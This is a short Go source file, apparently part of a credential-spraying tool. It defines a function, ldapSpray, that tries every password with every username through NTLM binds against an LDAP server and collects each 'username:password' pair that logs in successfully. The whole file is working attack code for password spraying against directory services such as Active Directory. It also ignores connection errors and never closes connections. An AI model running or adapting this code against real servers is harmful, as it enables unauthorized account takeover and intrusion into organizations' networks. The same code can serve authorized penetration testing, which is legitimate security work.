package main

import (
	"fmt"
	"github.com/go-ldap/ldap/v3"
	"strconv"

	"sync"
)



func ldapSpray(wg *sync.WaitGroup, channelToCommunicate chan string,  taskToRun task, storeResult *int) {
	defer wg.Done()
	internalCounter := 0
	if taskToRun.target.port == 0 {
		taskToRun.target.port = 389
	}
	for _,password := range taskToRun.passwords {
		for _,username := range taskToRun.usernames {
			if internalCounter >= *storeResult {
				conn, err := ldap.DialURL("ldap://"+taskToRun.target.host+":"+strconv.Itoa(taskToRun.target.port))
				req := &ldap.NTLMBindRequest{
					Domain:   "test",
					Username: username,
					Password: password,
				}
				_,err = conn.NTLMChallengeBind(req)
				if err != nil {
					fmt.Print("-")
				} else {
					fmt.Print("+")
					channelToCommunicate <- username+":"+password
				}
				//conn.Close()
				*storeResult++
			} else {

			}
			internalCounter++
		}
	}
}